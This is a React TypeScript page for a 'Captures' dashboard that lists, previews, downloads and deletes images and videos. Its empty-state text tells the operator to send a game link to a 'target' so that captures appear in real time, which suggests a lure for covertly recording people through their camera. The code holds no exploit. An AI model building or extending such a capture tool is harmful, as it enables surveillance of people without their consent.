import { useEffect, useState, useCallback, useMemo } from 'react'
import { api, Capture } from '../api/client'
import ConfirmDialog from '../components/ConfirmDialog'
import ErrorBanner from '../components/ErrorBanner'

function fmtSize(b: number) {
  if (b < 1024) return `${b} B`
  if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`
  return `${(b / 1048576).toFixed(2)} MB`
}

function relTime(ts: number) {
  const diff = Date.now() / 1000 - ts
  if (diff < 10) return 'just now'
  if (diff < 60) return `${Math.floor(diff)}s ago`
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`
  return `${Math.floor(diff / 86400)}d ago`
}

export default function Captures() {
  const [captures, setCaptures] = useState<Capture[]>([])
  const [total, setTotal] = useState(0)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [lightbox, setLightbox] = useState<number | null>(null)
  const [sort, setSort] = useState('newest')
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [deleting, setDeleting] = useState(false)
  const [search, setSearch] = useState('')
  const [page, setPage] = useState(1)
  const [totalPages, setTotalPages] = useState(1)
  const [dialog, setDialog] = useState<{ type: 'single', id: string } | { type: 'all' } | null>(null)
  const [dialogBusy, setDialogBusy] = useState(false)
  const perPage = 60

  const refresh = useCallback(async () => {
    try {
      setError(null)
      const data = await api.captures(page, perPage, sort)
      setCaptures(data.captures)
      setTotal(data.total)
      setTotalPages(Math.max(1, data.pages))
    } catch (e) { setError(e instanceof Error ? e.message : 'Failed to load') }
    finally { setLoading(false) }
  }, [sort, page])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 10000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  const filtered = useMemo(() => {
    if (!search) return captures
    const q = search.toLowerCase()
    return captures.filter(c =>
      c.filename.toLowerCase().includes(q)
      || c.file_type.toLowerCase().includes(q)
      || c.session_id.toLowerCase().includes(q)
    )
  }, [captures, search])

  const del = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation()
    setDialog({ type: 'single', id })
  }

  const delAll = async () => {
    setDialog({ type: 'all' })
  }

  const confirmDelete = async () => {
    if (!dialog) return
    setDialogBusy(true)
    setDeleting(true)
    try {
      if (dialog.type === 'single') {
        await api.deleteCapture(dialog.id)
      } else {
        await api.deleteAllCaptures()
      }
      setDialog(null)
      await refresh()
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Failed to delete')
    } finally {
      setDeleting(false)
      setDialogBusy(false)
    }
  }

  const isVideo = (ft: string) => ft.includes('video')

  return (
    <div className="space-y-4 stagger">
      <ErrorBanner error={error} onDismiss={() => setError(null)} />

      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Captures</h1>
          <p className="text-sm text-tertiary mt-0.5">
            {total} snapshot{total !== 1 ? 's' : ''}
            {filtered.length < captures.length ? ` · ${filtered.length} shown` : ''}
          </p>
        </div>
        <div className="flex gap-2">
          <select value={sort} onChange={e => { setSort(e.target.value); setPage(1) }} className="select-apple">
            <option value="newest">Newest</option>
            <option value="oldest">Oldest</option>
            <option value="largest">Largest</option>
          </select>
          <button onClick={() => setAutoRefresh(!autoRefresh)} className={`select-apple cursor-pointer ${autoRefresh ? 'accent-bg accent' : ''}`}>
            {autoRefresh ? '● Live' : 'Paused'}
          </button>
          <button onClick={() => { setLoading(true); refresh() }} className="select-apple cursor-pointer">⟳</button>
          {captures.length > 0 && (
            <button onClick={delAll} disabled={deleting} className={`select-apple cursor-pointer ${deleting ? 'opacity-50' : ''}`} style={{ color: 'var(--accent)' }}>🗑 {deleting ? 'Deleting...' : 'All'}</button>
          )}
        </div>
      </div>

      <input
        type="text"
        placeholder="Search by filename, type, or session ID..."
        value={search}
        onChange={e => setSearch(e.target.value)}
        className="input-apple"
      />

      {loading ? (
        <div className="flex justify-center py-20"><div className="spinner"></div></div>
      ) : error ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">⚠️</div>
          <h3>Failed to load captures</h3>
          <p>{error}</p>
          <button onClick={() => { setLoading(true); refresh() }} className="inline-block mt-5 px-4 py-2 nav-link active">⟳ Retry</button>
        </div>
      ) : filtered.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">{search ? '🔍' : '📷'}</div>
          <h3>{search ? 'No matches' : 'No captures yet'}</h3>
          <p>{search ? 'Try a different search term' : 'Send the game link to a target. Captures appear here in real-time.'}</p>
          {!search && <a href="/t/face-runner" target="_blank" rel="noreferrer" className="inline-block mt-5 px-4 py-2 nav-link active">🎮 Open Game</a>}
        </div>
      ) : (
        <>
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
            {filtered.map((c, i) => {
              const recent = Date.now() / 1000 - c.created_at < 30
              return (
                <div
                  key={c.id}
                  onClick={() => setLightbox(captures.indexOf(c))}
                  className={`group relative bg-secondary border-subtle radius-card overflow-hidden cursor-pointer transition-all duration-200 animate-scale-in hover:-translate-y-1 shadow-card ${recent ? 'shadow-card-lg' : ''}`}
                  style={{ animationDelay: `${i * 0.03}s`, animationFillMode: 'both' }}
                >
                  {isVideo(c.file_type) ? (
                    <div className="h-32 flex items-center justify-center bg-primary text-4xl">🎬</div>
                  ) : (
                    <img src={c.url} alt={c.filename} loading="lazy" className="h-32 w-full object-cover" />
                  )}
                  {recent && (
                    <div className="absolute top-2 left-2 badge" style={{ background: 'var(--accent)', color: '#fff' }}>NEW</div>
                  )}
                  <button onClick={e => del(c.id, e)} className="absolute top-2 right-2 w-6 h-6 rounded-full bg-red-500/90 text-white text-xs opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">×</button>
                  <div className="p-2.5">
                    <div className="text-xs text-secondary truncate">{c.filename}</div>
                    <div className="flex justify-between mt-1.5">
                      <span className="text-[10px] text-tertiary">{relTime(c.created_at)}</span>
                      <span className="text-[10px] text-tertiary mono">{fmtSize(c.file_size)}</span>
                    </div>
                  </div>
                </div>
              )
            })}
          </div>

          {totalPages > 1 && (
            <div className="flex items-center justify-center gap-3 py-4">
              <button onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page <= 1}
                className="px-4 py-2 text-sm radius-sm transition-colors disabled:opacity-30"
                style={{ backgroundColor: 'var(--bg-tertiary)', color: 'var(--secondary)' }}>‹ Prev</button>
              <span className="text-xs text-tertiary">Page {page} of {totalPages}</span>
              <button onClick={() => setPage(p => Math.min(totalPages, p + 1))} disabled={page >= totalPages}
                className="px-4 py-2 text-sm radius-sm transition-colors disabled:opacity-30"
                style={{ backgroundColor: 'var(--bg-tertiary)', color: 'var(--secondary)' }}>Next ›</button>
            </div>
          )}
        </>
      )}

      {lightbox !== null && captures[lightbox] && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-6 animate-scale-in"
          onClick={() => setLightbox(null)}
          onKeyDown={e => { if (e.key === 'Escape') setLightbox(null); if (e.key === 'ArrowLeft' && lightbox > 0) setLightbox(lightbox - 1); if (e.key === 'ArrowRight' && lightbox < captures.length - 1) setLightbox(lightbox + 1) }}
          style={{ backgroundColor: 'rgba(0,0,0,0.92)' }}
          tabIndex={0} autoFocus>
          <button className="absolute top-4 right-6 text-white/60 hover:text-white text-4xl" onClick={() => setLightbox(null)}>×</button>
          {lightbox > 0 && <button className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox - 1) }}>‹</button>}
          {lightbox < captures.length - 1 && <button className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox + 1) }}>›</button>}
          {isVideo(captures[lightbox].file_type) ? (
            <video src={captures[lightbox].url} controls autoPlay className="max-w-[95%] max-h-[85vh] radius-card-lg" />
          ) : (
            <img src={captures[lightbox].url} onClick={e => e.stopPropagation()} className="max-w-[95%] max-h-[85vh] radius-card-lg shadow-card-lg" />
          )}
          <div className="absolute bottom-6 left-1/2 -translate-x-1/2 text-secondary text-sm px-4 py-2 radius-card" style={{ backgroundColor: 'var(--bg-glass)' }}>
            {captures[lightbox].filename} · {fmtSize(captures[lightbox].file_size)} · {relTime(captures[lightbox].created_at)}
            <button onClick={() => { const a = document.createElement('a'); a.href = captures[lightbox].url; a.download = captures[lightbox].filename; a.click() }} className="ml-3 text-accent hover:underline">⬇ Download</button>
          </div>
        </div>
      )}

      <ConfirmDialog
        open={dialog !== null}
        title={dialog?.type === 'all' ? 'Delete all captures?' : 'Delete capture?'}
        description={dialog?.type === 'all'
          ? 'This will permanently remove every captured image and video. This action cannot be undone.'
          : 'This capture will be permanently deleted.'}
        confirmLabel={dialog?.type === 'all' ? 'Delete all' : 'Delete capture'}
        tone="danger"
        busy={dialogBusy}
        onClose={() => { if (!dialogBusy) setDialog(null) }}
        onConfirm={confirmDelete}
      />
    </div>
  )
}
